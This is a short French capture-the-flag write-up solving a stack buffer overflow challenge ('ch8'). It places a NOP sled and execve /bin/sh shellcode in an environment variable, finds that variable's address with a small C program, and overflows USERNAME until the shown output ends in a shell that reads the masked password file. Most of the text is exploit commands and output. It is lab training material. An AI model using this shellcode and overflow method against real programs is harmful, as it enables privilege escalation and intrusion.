On va mettre dans l'environement un shellcode:
export SHELLCODE=$(python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"')

On creer un petit programme en C pour savoir a quelle addresse se trouve notre nouveau SHELLCODE:
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char **argv)
{
	char *ptr;
	ptr = getenv(argv[1]);
	if( ptr == NULL )
		printf("%s not found\n", argv[1]);
	else
		printf("%s found at %08x\n", argv[1], (unsigned int)ptr);
	return 0;
}

Ensuite on va utiliser la variable USERNAME qui n'existe pas en balancant l'adresse de SHELLCODE x fois jusqu'a ecraser l'eip
$ /tmp/gbourgeo/getaddr SHELLCODE
SHELLCODE found at bffffbae

On va tester des valeurs juska ce que le programme renvoi un segfault.

$ export USERNAME=$(python -c 'print "\xae\xfb\xff\xbf"*102') && ./ch8
[+] Getting env...
HOME     = /challenge/app-systeme/ch8
USERNAME = ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????/bin/bash
SHELL    = /bin/bash
PATH     = /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/opt/tools/checksec/

$ export USERNAME=$(python -c 'print "\xae\xfb\xff\xbf"*103') && ./ch8
[+] Getting env...
HOME     = ????????????????????????????????????????????????????/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/opt/tools/checksec/
USERNAME = /tools/checksec/
SHELL    = h8
PATH     = ????????????????????????????????????????????????????????????????????????????????????????????????????????/bin/bash
Segmentation fault
-> Ca sonne bon.

$ export USERNAME=$(python -c 'print "\xae\xfb\xff\xbf"*104') && ./ch8
[+] Getting env...
Segmentation fault
-> ok...

$ export USERNAME=$(python -c 'print "\xae\xfb\xff\xbf"*105') && ./ch8
[+] Getting env...
sh-4.2$ cat .passwd
************
sh-4.2$ exit

DONE !!

